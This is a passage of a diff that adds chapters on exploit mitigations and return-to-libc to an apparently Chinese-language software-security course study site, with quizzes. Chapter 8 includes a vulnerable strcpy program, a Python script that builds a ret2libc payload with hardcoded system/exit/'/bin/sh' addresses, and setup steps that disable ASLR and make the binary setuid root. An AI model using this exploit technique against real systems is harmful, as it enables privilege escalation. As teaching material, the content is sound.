+          <label class="opt"><input type="checkbox" name="q6-5" value="B"><span>B. malloc</span></label>
+          <label class="opt"><input type="checkbox" name="q6-5" value="C"><span>C. syslog</span></label>
+          <label class="opt"><input type="checkbox" name="q6-5" value="D"><span>D. sprintf</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+    </div>
+    <button class="btn primary" data-mark-read>标记本章已读</button>
+  </section>
+
+  <!-- ================= 第 7 章 ================= -->
+  <section class="chapter" id="ch7">
+    <div class="ch-kicker">第 7 章 · 对应《第2讲 软件安全2-3》与 2-4 第 2、9–10 页</div>
+    <h1>防御机制与绕过</h1>
+    <p class="lead">这一章回答一个问题：<strong>既然能改返回地址，操作系统和编译器怎么办？</strong>答案是四类动作——修 bug、让注入代码不能执行、在返回前检查、把地址随机化；而每一种防御都有明确的绕过方式，这正是下一章 ret2libc / ROP 的出场理由。</p>
+
+    <h2>7.1 防御的四条路线</h2>
+    <div class="table-wrap">
+      <table>
+        <tr><th>路线</th><th>课件列出的手段</th><th>核心思想</th></tr>
+        <tr><td>修 bug</td><td>软件审查、静态分析（Coverity、Prefast/Prefix）、用类型安全语言重写</td><td>从源头消除；但遗留系统重写困难</td></tr>
+        <tr><td>允许溢出、不让代码执行</td><td>NX 位</td><td>栈/堆标为不可执行，注入的 shellcode 跑不起来</td></tr>
+        <tr><td>运行时检查</td><td>canary word、StackGuard、Stack-smashing Protection、LibSafe</td><td>检测到溢出就挂起进程</td></tr>
+        <tr><td>减少溢出机会</td><td>控制栈与数据栈分离、ASLR、CFI</td><td>让地址不可预测，或让跳转必须合法</td></tr>
+      </table>
+    </div>
+
+    <h2>7.2 先看清楚要保护什么</h2>
+    <div class="mem-figure">
+      <div class="mem-stack">
+        <div class="mem-row"><div class="val">0xC0000000</div><div class="lbl">user stack（%esp）</div></div>
+        <div class="mem-row"><div class="val">↓</div><div class="lbl">shared libraries（ASLR 随机化对象）</div></div>
+        <div class="mem-row"><div class="val">0x40000000</div><div class="lbl">heap（brk）</div></div>
+        <div class="mem-row"><div class="val">0x08048000</div><div class="lbl">.text / .data（从 exec 装载；PIE 才随机）</div></div>
+      </div>
+    </div>
+    <div class="mem-cap">图：第 2 讲 2-3 第 4 页的进程内存布局。整章防御都是针对这张图上的某一行。</div>
+
+    <h2>7.3 W^X / NX / DEP：让注入的代码跑不起来</h2>
+    <p>把栈段与堆段标记为<strong>不可执行</strong>，溢出只能改数据，不能执行数据里的代码。</p>
+    <ul>
+      <li>硬件基础：每个页表项（PTE）都有 NX 位。AMD Athlon 64 称 NX-bit，Intel P4 Prescott 称 XD-bit。</li>
+      <li>系统部署：Linux 的 PaX 项目；Windows 从 XP SP2 起引入 DEP（Data Execute Prevention）。</li>
+      <li>优点：<strong>无需修改代码、无需重新编译</strong>。</li>
+      <li>缺点：需要硬件支持；<strong>不能防御 return-to-libc / ROP</strong>；JIT 编译器等程序需要可执行的堆（生成的数据就是代码）。</li>
+    </ul>
+    <p>课件的对比实验很直接：同一份 <code>shellcode.c</code>，用 <code>-z execstack</code> 编译能弹出 shell，用 <code>-z noexecstack</code> 编译则崩溃。对应可执行文件在同目录：<code>x_shellcode</code> 与 <code>nx_shellcode</code>；<code>systemexit.c</code> 也编译出 <code>x_systemexit</code>、<code>nx_systemexit</code> 两个版本作对照。</p>
+
+    <h2>7.4 StackGuard / canary：在返回前对暗号</h2>
+    <p>在局部变量与控制信息（ebp、RET）之间插入一个“金丝雀”字，函数返回前检查它是否被改。攻击者的连续覆盖会<strong>先踩到 canary</strong>，于是被发现。</p>
+    <div class="mem-figure">
+      <div class="mem-stack">
+        <div class="mem-row"><div class="val">高地址</div><div class="lbl">RET</div></div>
+        <div class="mem-row"><div class="val">↑</div><div class="lbl">ebp</div></div>
+        <div class="mem-row mark"><div class="val">↑</div><div class="lbl">canary ← 溢出必须先跨过它</div></div>
+        <div class="mem-row"><div class="val">↑</div><div class="lbl">local（含 buf）</div></div>
+        <div class="mem-row"><div class="val">低地址</div><div class="lbl">%esp</div></div>
+      </div>
+    </div>
+    <p>两种 canary：</p>
+    <ul>
+      <li><strong>随机 canary</strong>：程序启动时选一个随机串，每个栈帧插入一个，返回前校验；</li>
+      <li><strong>Terminator canary</strong>：取 <code>0</code>、换行、EOF 等终止符，因为字符串函数不会复制超出终止符的内容，攻击者用字符串函数很难破坏它。</li>
+    </ul>
+    <p>StackGuard 是 GCC 的补丁，编译选项 <code>-fstack-protector</code> / <code>-fstack-protector-strong</code>。优点是不改代码只重编译；缺点是性能损失（课件举例 Apache httpd 额外开销 8%）、只防 stack smashing、且<strong>基于 secret，若攻击者能读内存就失效</strong>。</p>
+
+    <div class="code-block">
+      <div class="code-head"><span class="src">bufferoverflow/protection.c · 第 6–13 行</span><span>C</span></div>
+      <pre data-lang="c">int main(int argc, char *argv[])
+{
+	char buf[BUFSIZE];
+	strcpy(buf, argv[1]);
+	printf(" Buf: %s\n", buf);
+	printf("&Buf: %p\n", &amp;buf);
+	return 0;
+}</pre>
+    </div>
+    <p>文件注释（第 15–34 行）把结论直接写了出来：<code>BUFSIZE=64</code>，到 EBP 是 64+4=68。默认编译（开 canary）时，输入 65 个 <code>1</code> 就报 <code>stack smashing detected</code>；加上 <code>-fno-stack-protector -z execstack</code> 后，输入 65/66/67 个字符只是“写进了 canary 但没人检查”，直到 68 个字符才 <strong>RET address affected; jump to invalid address</strong>。这组对比说明 canary 的作用点：<em>它不阻止覆盖，只阻止“覆盖后还能正常返回”。</em></p>
+
+    <h2>7.5 StackShield：把返回地址抄一份</h2>
+    <p>函数调用前把 RET 与 ebp 复制到“安全”位置，返回前恢复。它<strong>与 canary 的关键区别是：不知道是否发生了溢出</strong>，只是把被改的值换回正确值，因此程序可以继续正常运行（攻击者也就无法劫持）。实现为 GCC 的汇编文件处理器。</p>
+
+    <h2>7.6 SafeStack：把栈劈成两半</h2>
+    <p>把栈分成<strong>安全栈</strong>（返回地址、寄存器、总是以安全方式访问的局部变量）与<strong>非安全栈</strong>（其他数据）。本质是隔离：非安全栈上的溢出碰不到安全栈里的返回地址。课件称其性能开销较小，并指出 WebAssembly 采用了这一思路；编译方式为 <code>clang-3.7 -fsanitize=safe-stack -o a.out test.c</code>。</p>
+
+    <h2>7.7 PointGuard：给指针加密</h2>
+    <p>对指针加密，加载到寄存器时解密。没有它时攻击者篡改指针就能访问指定位置；有了它，被改的密文解密后指向一个<strong>不由攻击者控制的位置</strong>，于是访问失败。课件只给了原理示意，未展开实现细节。</p>
+
+    <h2>7.8 ASLR：把地址藏起来</h2>
+    <p>ASLR（Address Space Layout Randomization）把<strong>共享库</strong>映射到进程内存的随机位置（课件原话），进而栈、堆也随之随机，攻击者不能直接跳转到 <code>system</code> 之类的函数。</p>
+    <ul>
+      <li>部署情况：Windows Vista 对 DLL 只有 <strong>8 位随机性</strong>；Linux（经 PaX）对库有 <strong>16 位</strong>。课件明确“ASLR 在 64 位系统使用更有效”。</li>
+      <li>其他随机化：系统调用号随机化、指令集随机化（ISR）。</li>
+      <li>优点：不改代码、不重编译。缺点：32 位保护有限；基于 secret，若能 dump 内存读到 ebp 等值就失效；有性能损失。</li>
+    </ul>
+    <div class="code-block">
+      <div class="code-head"><span class="src">bufferoverflow/ASLR.c · 第 4–10 行</span><span>C</span></div>
+      <pre data-lang="c">void main(){
+	char x[12];
+	char * y = malloc(sizeof(char)*12);
+
+	printf("Address of buffer x (on stack): 0x%x\n", x);
+	printf("Address of buffer y (on  heap): 0x%x\n", y);
+}</pre>
+    </div>
+    <p>把 <code>kernel.randomize_va_space</code> 依次设为 0、1、2 运行，对比两次输出的栈地址与堆地址：0 时完全不变，1 时栈与共享库变，2 时堆也变。</p>
+
+    <h2>7.9 ASLR 的盲区：.text 需要 PIE</h2>
+    <p>只开 ASLR，程序自身的代码段 <code>.text</code> 仍是固定地址（课件第 26 页强调）。要让代码段也随机，需要 <strong>PIE</strong>（Position Independent Executable）：<code>gcc -fPIE -pie</code>。编译器把绝对地址访问改成间接访问，共享库（.so）本身就是按 PIE 编译的。</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">bufferoverflow/PIE.c · 第 3–9 行</span><span>C</span></div>
+      <pre data-lang="c">void *getEIP() {
+  return __builtin_return_address(0)-0x5;
+}
+int main(int argc, char** argv) {
+  printf("EIP located at: %p\n", getEIP());
+  return 0;
+}</pre>
+    </div>
+    <p>文件注释给出的对照实验：<code>gcc -o noPIE PIE.c</code> 多次运行地址相同；<code>gcc -fPIE -pie -o withPIE PIE.c</code> 多次运行地址不同。<code>__builtin_return_address(0)</code> 取返回地址，减去 0x5 是因为 <code>call</code> 指令本身 5 字节，得到 call 的起始位置，即当时的 EIP。</p>
+
+    <h2>7.10 GOT / PLT：延迟绑定留下的可写入口</h2>
+    <p>动态链接的函数地址在<strong>第一次被调用时才解析</strong>：调用点先跳到 PLT，PLT 表项里 <code>jmp *GOT项</code>；未解析时该 GOT 项指向 PLT 的解析代码，解析完成后写入真实地址，下次直接跳过去。</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">bufferoverflow/GOT.c · 第 4–9 行 + 文件注释中的 gdb 观察</span><span>C</span></div>
+      <pre data-lang="c">int main(){
+    printf("This is my first call\n");
+    printf("This is my second call\n");
+    putchar('l');
+    putchar('l');
+    return 0;
+}
+// x 0x804a00c  -> 第一次 0x080482e6（PLT 解析桩）
+//              -> 第二次 0xb7dc9ca0（puts 真实地址）</pre>
+    </div>
+    <p>课件由此提出威胁：<strong>如果改掉 GOT 表中已解析的函数地址</strong>，下一次调用就会跳到攻击者指定的位置（GOT 覆盖）。这也是“信息泄露 + 改写 GOT”能绕过 ASLR 的思路：先泄露 libc 地址，再算偏移。</p>
+    <p style="color:var(--muted);font-size:14px">补充说明：课件只讲了 GOT 可写与覆盖，没有讲 GNU_RELRO / 部分 RELRO / 完全 RELRO 这些现代缓解。此处不展开，考试以课件范围为准。</p>
+
+    <h2>7.11 CFI：检查每一次间接跳转</h2>
+    <p>控制流完整性（CFI）静态得出“正常的”跳转集合，然后插桩检查实际跳转是否落在集合内。检查对象包括<strong>函数返回、函数指针、虚方法</strong>。优点是不用改代码；缺点是性能损失、需要更好的编译器、需要拿到全部代码（否则无法确定合法目标集合）。</p>
+
+    <h2>7.12 暴力破解 ASLR</h2>
+    <p>32 位 Linux 的栈随机性只有 <strong>19 位</strong>，地址空间为 2<sup>19</sup> = 524288。课件给出的实测：<strong>约 8 分半、25 万次尝试</strong>（每次攻击耗时/尝试次数不尽相同）。实验脚本 <code>brute_force_ASLR.sh</code> 就是循环运行 <code>./stack</code> 并统计次数与时间。</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">bufferoverflow/brute_force_ASLR.sh · 第 5–14 行</span><span>Bash</span></div>
+      <pre data-lang="bash">while [ 1 ]
+  do
+  	value=$(($value + 1))
+  	duration=$SECONDS
+  	min=$(($duration / 60))
+  	sec=$(($duration % 60))
+  	echo "$min minutes and $sec seconds elapsed."
+  	echo "The program has run $value times so far"
+  	./stack
+  done</pre>
+    </div>
+    <p>脚本只说“跑了很多次”，真正让它成功的是<strong>每次 badfile 里的猜测地址不同</strong>（stack_exploit.py 里 <code>+0x77</code> 的调整量需要遍历）。这解释了为什么 ASLR 在 64 位下更有效：位数一多，暴力枚举就不现实了。</p>
+
+    <h2>7.13 防御与绕过一览</h2>
+    <div class="table-wrap">
+      <table>
+        <tr><th>防御</th><th>挡住什么</th><th>拦不住 / 绕过</th></tr>
+        <tr><td>NX / DEP</td><td>栈上执行注入 shellcode</td><td>ret2libc、ROP（复用已有代码）</td></tr>
+        <tr><td>Canary</td><td>连续覆盖到返回地址</td><td>先泄露 canary；跳写（不经过 canary，如 %n 直写 GOT）</td></tr>
+        <tr><td>StackShield</td><td>改返回地址</td><td>不检测，只恢复；其它控制数据（函数指针）不管</td></tr>
+        <tr><td>ASLR</td><td>硬编码地址跳转</td><td>暴力破解、内存泄露（GOT/PLT）、32 位熵不足</td></tr>
+        <tr><td>PIE</td><td>代码段固定地址</td><td>同样需要泄露基址；只防 .text，不防库</td></tr>
+        <tr><td>CFI</td><td>跳转到非法目标</td><td>合法 gadget 链仍可能被拼出（课件未展开）</td></tr>
+      </table>
+    </div>
+
+    <h3>易错点 / 考点</h3>
+    <ul>
+      <li>“NX 能防溢出”是错的：NX 防的是<strong>执行注入代码</strong>，溢出本身照样发生。</li>
+      <li>canary 的位置是“局部变量与控制信息之间”，所以它先于 ebp/RET 被覆盖。</li>
+      <li>ASLR 默认只随机化库/栈/堆；<strong>.text 随机化是 PIE 的功劳</strong>，这是课件反复强调的区分点。</li>
+      <li>StackShield 与 canary 的差别：前者不知道有没有溢出，后者知道。</li>
+      <li>SafeStack 保护的是返回地址等“安全数据”，不是让所有局部变量都安全。</li>
+    </ul>
+
+    <h2>7.14 2-4 的补刀：NX 之后只剩两条路</h2>
+    <p>2-4 第 2 页用最省字的方式把整讲的前提说完：<strong>防御是“不能在栈中运行代码”，攻击是“无须在栈中运行代码”</strong>。第 9–10 页再加一句设问——开了栈不可执行保护以后，“怎么绕过这种保护机制”。</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>绕过路线</th><th>复用什么</th><th>前提</th><th>落点</th></tr>
+        <tr><td>ret2libc</td><td>整段库函数，如 <code>system()</code></td><td>知道 libc 函数地址与一个字符串地址</td><td>第 8 章</td></tr>
+        <tr><td>ROP</td><td>以 <code>ret</code> 结尾的指令片段（gadget）</td><td>能找到 gadget 且地址可预测</td><td>第 9 章</td></tr>
+      </table>
+    </div>
+    <p>所以 2-4 把 ret2libc、ROP 紧接在“防御方法简介”之后讲：它们<strong>不是新漏洞，而是对 NX 的绕过</strong>。这两条路的共同点是——代码本来就在内存里、并且那段内存是可执行的，攻击者只负责改写“接下来跳哪”。</p>
+
+    <div class="quiz">
+      <div class="quiz-title">自测 · 第 7 章<span>5 题</span></div>
+
+      <div class="q" data-answer="B" data-explain="课件明确列出 NX 的缺点：需要硬件支持、不能防御 return-to-libc/ROP、JIT 需要可执行堆。">
+        <div class="q-stem"><span class="qno">1.</span>NX / DEP 不能防御下列哪类攻击？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q7-1" value="A"><span>A. 在栈上执行注入的 shellcode</span></label>
+          <label class="opt"><input type="radio" name="q7-1" value="B"><span>B. return-to-libc / ROP</span></label>
+          <label class="opt"><input type="radio" name="q7-1" value="C"><span>C. 栈上数据被覆盖</span></label>
+          <label class="opt"><input type="radio" name="q7-1" value="D"><span>D. JIT 生成的代码被执行</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="C" data-explain="canary 插在局部变量与控制信息（ebp、RET）之间；这样任何向高地址的连续溢出都会先破坏 canary，函数返回前检查即可发现。">
+        <div class="q-stem"><span class="qno">2.</span>canary 通常放在什么位置？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q7-2" value="A"><span>A. 参数与返回地址之间</span></label>
+          <label class="opt"><input type="radio" name="q7-2" value="B"><span>B. 返回地址之后（更高地址）</span></label>
+          <label class="opt"><input type="radio" name="q7-2" value="C"><span>C. 局部变量与 ebp/RET 之间</span></label>
+          <label class="opt"><input type="radio" name="q7-2" value="D"><span>D. 堆的开头</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="A" data-explain="课件第 26 页专门指出：只开 ASLR 时 .text 代码段没有随机化；第 27–28 页说明只有用 -fPIE -pie 编译，.text 才会随机加载。">
+        <div class="q-stem"><span class="qno">3.</span>开启 ASLR 但<strong>不用</strong> PIE 编译，下列哪一部分地址仍然固定？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q7-3" value="A"><span>A. 程序自身的 .text 代码段</span></label>
+          <label class="opt"><input type="radio" name="q7-3" value="B"><span>B. 共享库</span></label>
+          <label class="opt"><input type="radio" name="q7-3" value="C"><span>C. 栈</span></label>
+          <label class="opt"><input type="radio" name="q7-3" value="D"><span>D. 堆</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="AB" data-multi="true" data-explain="课件“绕过 ASLR”一页列出的两条是 Brute force 与内存泄漏（GOT/PLT）。编译优化、静态链接都不是本讲给出的绕过手段。">
+        <div class="q-stem"><span class="qno">4.</span>课件列出的绕过 ASLR 的方法包括？<span class="q-tag">多选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="checkbox" name="q7-4" value="A"><span>A. 暴力破解（brute force）</span></label>
+          <label class="opt"><input type="checkbox" name="q7-4" value="B"><span>B. 通过 GOT/PLT 做内存泄露</span></label>
+          <label class="opt"><input type="checkbox" name="q7-4" value="C"><span>C. 用 -O2 优化编译</span></label>
+          <label class="opt"><input type="checkbox" name="q7-4" value="D"><span>D. 静态链接</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="B" data-explain="StackShield 只是把 RET/ebp 备份并在返回前恢复，它并不知道是否发生了溢出——课件用这一点与 canary 作对比。">
+        <div class="q-stem"><span class="qno">5.</span>关于 StackShield，下列说法正确的是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q7-5" value="A"><span>A. 它能检测溢出并终止进程</span></label>
+          <label class="opt"><input type="radio" name="q7-5" value="B"><span>B. 它只恢复返回地址，不知道是否发生溢出</span></label>
+          <label class="opt"><input type="radio" name="q7-5" value="C"><span>C. 它把栈分成安全栈与非安全栈</span></label>
+          <label class="opt"><input type="radio" name="q7-5" value="D"><span>D. 它给指针加密</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+    </div>
+    <button class="btn primary" data-mark-read>标记本章已读</button>
+  </section>
+
+  <!-- ================= 第 8 章 ================= -->
+  <section class="chapter" id="ch8">
+    <div class="ch-kicker">第 8 章 · 对应《第2讲 软件安全2-4》第 3–47 页；代码来自 returntolibc/</div>
+    <h1><span class="term" data-term="g-ret2libc" tabindex="0"><a href="#g-ret2libc">Return-to-libc</a></span></h1>
+    <p class="lead">NX 让“跳到自己的 shellcode”失效，于是把返回地址改成<strong>已有库函数</strong>的地址：不写新代码，只借 <code>system()</code> 的代码执行 <code>system("/bin/sh")</code>。这一章以 2-4 的讲解页为主线（第 11–47 页），代码取自 <code>returntolibc/</code>。</p>
+
+    <div class="callout">
+      <b>来源说明</b>
+      本节依据《第2讲 软件安全2-4》第 11–47 页：libc.so 的性质、<code>system()</code> 的用法、返回地址改写后栈帧的逐格变化、Task A/B/C 三组实验，以及“程序名长度会挪动环境变量地址”这一实测坑。源码与注释取自 <code>returntolibc/</code>，凡课件只给结论未给推导的地方已标注“课件未展开”。
+    </div>
+
+    <h2>8.1 漏洞程序：与 stack.c 同构</h2>
+    <div class="code-block">
+      <div class="code-head"><span class="src">returntolibc/returntolibc_stack.c · 第 5–23 行</span><span>C</span></div>
+      <pre data-lang="c">int vulfunc(char *str)
+{
+	char buffer[100];
+	strcpy(buffer, str);
+	return 1;
+}
+
+int main(){
+	char str[400];
+	FILE *badfile;
+
+	badfile = fopen("badfile","r");
+	fread(str, sizeof(char), 300, badfile);
+	vulfunc(str);
+
+	printf("Returned properly\n");
+	fclose(badfile);
+	return 0;
+}</pre>
+    </div>
+    <p>结构、偏移都与第 4 章相同：<code>buffer[100]</code>，从 buffer 到 ebp 是 108，到返回地址是 112。不同的是编译选项——注释里用 <code>-z noexecstack</code>，即<strong>栈不可执行</strong>，所以第 4 章的 badfile 在这里只能让程序崩溃。</p>
+
+    <h2>8.2 栈上的“假调用帧”</h2>
+    <p>函数结语是 <code>leave; ret</code>。<code>leave</code> 等价于 <code>mov %ebp,%esp; pop %ebp</code>，随后 <code>ret</code> 从栈顶弹出 4 字节放进 EIP。既然这 4 字节来自我们写的 badfile，就可以让它等于 <code>system</code>，同时把后面的栈内容布置成 system 的“调用者帧”：</p>
+    <div class="mem-figure">
+      <div class="mem-stack">
+        <div class="mem-row mark"><div class="val">offset 112</div><div class="lbl">RET ← 改为 system() 的地址</div></div>
+        <div class="mem-row"><div class="val">offset 116</div><div class="lbl">system 返回后要跳的地址 ← exit() 的地址</div></div>
+        <div class="mem-row"><div class="val">offset 120</div><div class="lbl">system 的第 1 个参数 ← "/bin/sh" 的地址</div></div>
+        <div class="mem-row"><div class="val">offset 124+</div><div class="lbl">更高地址，无需关心</div></div>
+      </div>
+    </div>
+    <p class="mem-cap">图：ret2libc 的三段式布局。ret 跳到 system 后，system 会把 offset 116 当成自己的返回地址、offset 120 当成第一个参数（cdecl 参数在 ebp+8）。</p>
+
+    <div class="code-block">
+      <div class="code-head"><span class="src">returntolibc/returntolibc_exploit.py · 第 4–14 行</span><span>Python 3</span></div>
+      <pre data-lang="python"># Fill content with none zero values
+content = bytearray(0xaa for i in range(300))
+
+a3 = 0xbffffdd8 # address of "/bin/sh"
+content[120:124] = (a3).to_bytes(4,byteorder='little')
+
+a2 =  0xb7e369d0  # address of exit()
+content[116:120] = (a2).to_bytes(4,byteorder='little')
+      
+a1 = 0xb7e42da0  # address of system()
+content[112:116] = (a1).to_bytes(4,byteorder='little')</pre>
+    </div>
+    <p>这三个地址都在文件注释里给出了获取方式：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">returntolibc/returntolibc_stack.c · 第 38–50 行（文件内注释）</span><span>gdb / shell</span></div>
+      <pre data-lang="text">gdb ./stack
+p system      -> 0xb7e42da0
+p exit        -> 0xb7e369d0
+quit
+
+export MYSHELL="/bin/sh"
+./envro
+Address: bffffdd8</pre>
+    </div>
+    <p><code>system</code> 与 <code>exit</code> 来自 <code>libc</code>；<code>"/bin/sh"</code> 的地址则来自<strong>环境变量</strong>——把 <code>MYSHELL</code> 设为 <code>/bin/sh</code>，再用 <code>envro.c</code> 打印它在进程环境区中的地址。</p>
+
+    <div class="code-block">
+      <div class="code-head"><span class="src">returntolibc/envro.c · 第 4–13 行</span><span>C</span></div>
+      <pre data-lang="c">int main(){
+	char *shell = (char *)getenv("MYSHELL");
+	if(shell){
+		printf("   Value: %s\n", shell);
+		printf(" Address: %x\n", (unsigned int)shell);
+	}
+	else
+		printf(" MYSHELL not found\n");
+	return 0;
+}</pre>
+    </div>
+    <div class="callout warn">
+      <b>运行前提</b>
+      <code>sysctl -w kernel.randomize_va_space=0</code>：libc 与栈的地址必须稳定，否则 0xb7e42da0 / 0xbffffdd8 这两个硬编码地址都不可用。这就是“ret2libc 需要先绕过 ASLR”的原因。<code>gcc -fno-stack-protector -z noexecstack -o stack returntolibc_stack.c</code>，再 <code>chown root</code> / <code>chmod 4755</code>。
+    </div>
+
+    <h2>8.3 为什么用 exit 当返回地址</h2>
+    <p>如果 offset 116 留空或指向垃圾，<code>system("/bin/sh")</code> 执行完返回时会跳到非法地址并崩溃——shell 可能已经拿到，但进程死得难看。填 <code>exit</code> 是一个“干净的收尾”，让程序在 shell 退出后正常终止。这是“构造完整调用帧”的工程习惯，不是必须项。</p>
+
+    <h2>8.4 与第 4 章的区别</h2>
+    <div class="table-wrap">
+      <table>
+        <tr><th></th><th>第 4 章 shellcode</th><th>第 8 章 ret2libc</th></tr>
+        <tr><td>RET 指向</td><td>栈上的 NOP 滑板 / shellcode</td><td>libc 中的 system</td></tr>
+        <tr><td>需要栈可执行</td><td>是（<code>-z execstack</code>）</td><td>否（<code>-z noexecstack</code>）</td></tr>
+        <tr><td>需要的额外数据</td><td>shellcode 自身</td><td>system 地址、退出地址、"/bin/sh" 地址</td></tr>
+        <tr><td>受 ASLR 影响</td><td>栈地址随机</td><td>库地址、环境区地址随机</td></tr>
+      </table>
+    </div>
+
+    <h2>8.5 libc.so：一份“运行时一定在、且可执行”的代码库</h2>
+    <p>先看这一章要解决什么问题。<strong>栈不可执行（NX）以后，攻击者自己写的那段机器码就算被写进栈，也没法当指令跑</strong>。但程序总要调用库函数——<code>printf</code>、<code>strcpy</code>、<code>malloc</code>、<code>system</code> 全在 libc 里，它们的机器码在运行时确实躺在内存里，而且所在内存页是<strong>可读可执行</strong>的。于是思路变成：既然不能执行“我写的代码”，那就执行“本来就在的代码”，只把参数换掉。</p>
+    <p><span class="term" data-term="g-libc" tabindex="0"><a href="#g-libc">libc</a></span>（<strong>libc.so</strong>）：Linux 上几乎所有 C 程序都会链接的基础库，约 2 MB，动态链接、运行时才映射进地址空间。生活类比：小区的公共工具间——工具不是你的，但你有钥匙，随时能借。<strong>在 42.c 里</strong>，3.2.7 说“<code>printf</code> 的地址编译期不知道”，那个地址就来自 libc；运行时由动态链接器填进 <code>.got.plt</code>。ret2libc 借的是同一份库，只不过借的是 <code>system</code>。</p>
+    <p>为什么偏偏借 <code>system</code>？因为它的签名是 <code>int system(const char *command)</code>——<strong>给我一个字符串，我当命令执行</strong>（2-4 第 12 页原话）。这与“拿到 shell”只差一个字符串 <code>"/bin/sh"</code>。而 libc 里本来就存着 <code>"/bin/sh"</code> 这个字符串，实验中也可以自己构造后放进环境变量区。</p>
+    <p><strong>易混点</strong>：<code>system()</code> 只是“再 fork 一个 shell 去跑命令”，它本身不会让当前进程变成 shell；拿到交互式 shell 靠的是 <code>/bin/sh</code> 这个子进程。</p>
+
+    <h2>8.6 改了返回地址之后，栈上每一格发生了什么</h2>
+    <p>ret2libc 最反直觉的一点：<strong>你跳到 <code>system</code> 的入口，却没有“调用者”</strong>。真实调用时，编译器会先 <code>push</code> 参数、再 <code>call</code> 压返回地址；这里是漏洞函数的 <code>leave; ret</code> 直接把你送到 <code>system</code>，所以这两样东西必须由你自己在栈上摆好。2-4 第 14–31 页就是用 <code>pro_epi_logue.c</code> 的序言/结语逐帧演示这件事。</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>时刻</th><th>栈上关键格（示意地址）</th><th>谁在用它</th></tr>
+        <tr><td><code>vul_func</code> 执行 <code>leave</code></td><td><code>ebp</code> 恢复成调用者的 <code>ebp</code></td><td>旧帧被丢弃</td></tr>
+        <tr><td><code>ret</code> 弹出返回地址</td><td>被改写的那格 = <code>system</code> 地址（如 <code>0xb7e42da0</code>）</td><td><code>eip</code> 跳进 libc</td></tr>
+        <tr><td><code>system</code> 序言 <code>push ebp; mov ebp,esp</code></td><td>此时 <code>ebp+4</code> = 原来的 RET 上面一格</td><td><code>system</code> 认为它是“返回地址”</td></tr>
+        <tr><td><code>system</code> 取参数</td><td><code>ebp+8</code> = 下一格</td><td>必须等于 <code>"/bin/sh"</code> 的地址</td></tr>
+      </table>
+    </div>
+    <p class="mem-cap">数值来自 2-4 第 34 页的 <code>gdb</code> 输出；栈地址为示意，实际值随环境变化。由此可得三条硬结论：<strong>RET 之后的第一格要填 <code>system</code> 的返回地址（习惯填 <code>exit</code>），第二格开始才是参数</strong>；参数个数与顺序由目标函数的调用约定决定（第 3.5 节）；偏移量必须用 <code>gdb</code> 量，不能背。</p>
+    <div class="callout">
+      <b>为什么这一步是“构造伪调用帧”</b>
+      正常调用链里，返回地址由 <code>call</code> 压、参数由调用者压；劫持后两者都缺失，所以攻击载荷必须同时补上“返回地址 + 参数”。这也解释了后面 ROP 为什么能通用：<code>ret</code> 天生就是“从栈上取下一个地址跳过去”，正好可以一个接一个地伪造调用。
+    </div>
+
+    <h2>8.7 Task A / B / C：攻击者到底要准备几样东西</h2>
+    <p>2-4 第 32–41 页把实验拆成三个任务，难度递增，正好对应“缺什么补什么”。</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>任务</th><th>要解决的问题</th><th>课件给的做法</th><th>本实验数值</th></tr>
+        <tr><td>Task A</td><td><code>system</code> 和 <code>exit</code> 的地址从哪来</td><td><code>gdb</code> 里 <code>p system</code> / <code>p exit</code>（第 34 页）</td><td><code>0xb7e42da0</code> / <code>0xb7e369d0</code></td></tr>
+        <tr><td>Task B</td><td>“<code>/bin/sh</code>”字符串放哪</td><td>写个小程序 <code>export MYSHELL</code>，运行时打印其地址（第 35–36 页）</td><td><code>0xbffffdd8</code>（随环境变）</td></tr>
+        <tr><td>Task C</td><td>参数怎么落到 <code>ebp+8</code></td><td>按 8.6 的帧结构自己推算偏移（第 37–41 页）</td><td>buffer 后 112 / 116（本站代码）</td></tr>
+      </table>
+    </div>
+    <p><strong>为什么先做 A 再做 B/C</strong>：地址不确定，后面摆帧都是空谈；字符串地址不确定，<code>system</code> 会拿到野指针。课件把“取地址”单独设为一个任务，就是在强调 ret2libc 的成败几乎全在“地址算得准不准”。</p>
+
+    <h2>8.8 一个容易忽略的坑：程序名长度会挪动环境变量</h2>
+    <p>2-4 第 46–47 页专门用一页讲这个坑：把打印环境变量地址的小程序复制成另一个名字（如 <code>envro</code> → <code>e</code>），同一份代码打印出的地址会变。<strong>原因</strong>：<code>argc/argv/envp</code> 以及环境字符串都压在新进程栈顶，程序名本身是 <code>argv[0]</code> 指向的字符串，也在栈上；名字变短，后面所有字符串整体上移，地址随之改变（第 47 页用 <code>x/100s</code> 直接看到布局差异）。</p>
